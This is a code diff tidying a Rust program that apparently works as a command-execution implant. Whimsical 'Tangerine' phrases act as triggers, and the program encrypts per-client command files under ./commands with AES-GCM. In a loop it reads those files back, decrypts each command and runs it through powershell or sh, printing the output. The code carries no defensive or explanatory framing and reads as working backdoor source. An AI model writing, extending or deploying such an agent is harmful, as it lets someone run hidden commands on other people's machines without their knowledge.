@@ -1,34 +1,30 @@
 use aes_gcm::{
     aead::{Aead, KeyInit},
-    Aes256Gcm, Nonce
+    Aes256Gcm, Nonce,
 };
-use std::{fs::File, fmt::format};
+use std::fs::File;
 use std::io::{BufRead, Write};
-use std::{env, io};
 use std::process::Command;
+use std::{env, io};
 
 include!(concat!(env!("OUT_DIR"), "/id.rs"));
 
 pub fn run() {
     let args: Vec<String> = env::args().collect();
     if args.len() >= 2 {
-    if args[1] == "Show me the magic Tangerine" {
-        println!("{}", client_id());
-        return;
-    } else if args[1] == "Create me a Tangerine" {
-        create_tangerine();
-        return;
-    } else if args[1] == "Hide my Tangerine" {
-        hide_tangerine();
-        return;
-    } else if args[1] == "Eat my Tangerine" {
-        let lines = read_tangerine();
-        for line in lines {
-            println!("Got {}", line);
+        if args[1] == "Show me the magic Tangerine" {
+            println!("{}", client_id());
+            return;
+        } else if args[1] == "Create my Tangerine" {
+            create_tangerine();
+            return;
+        } else if args[1] == "Hide my Tangerine" {
+            hide_tangerine();
+            return;
         }
     }
-}
 
+    // Eat my tangerine
     loop {
         println!("Looping!");
         let commands = read_tangerine();
@@ -37,15 +33,15 @@ pub fn run() {
         for command in commands {
             let output = if cfg!(target_os = "windows") {
                 Command::new("powershell")
-                        .args(["/C", &command])
-                        .output()
-                        .expect("failed to execute process")
+                    .args(["/C", &command])
+                    .output()
+                    .expect("failed to execute process")
             } else {
                 Command::new("sh")
-                        .arg("-c")
-                        .arg(&command)
-                        .output()
-                        .expect("failed to execute process")
+                    .arg("-c")
+                    .arg(&command)
+                    .output()
+                    .expect("failed to execute process")
             };
             println!("status: {}", output.status);
             println!("{}", String::from_utf8(output.stdout).unwrap());
@@ -89,12 +85,12 @@ fn hide_tangerine() {
     }
 
     let mut file = File::create(format!("./commands/{}.tangerine", client_id())).unwrap();
-    file.write(b"TANGERINE_ENC\n");
+    file.write(b"TANGERINE_ENC\n").unwrap();
     for line in encrypted_lines {
-        file.write(&line);
-        file.write(b"\n");
+        file.write(&line).unwrap();
+        file.write(b"\n").unwrap();
     }
-    file.write(b"!TANGERINE_ENC");
+    file.write(b"!TANGERINE_ENC").unwrap();
 }
 
 fn read_tangerine() -> Vec<String> {
@@ -116,7 +112,7 @@ fn read_tangerine() -> Vec<String> {
 
     for line in lines {
         if line == b"!TANGERINE_ENC" {
-            continue
+            continue;
         }
         let decrypted = cipher.decrypt(nonce, line).unwrap();
         decrypted_lines.push(String::from_utf8(decrypted).unwrap());
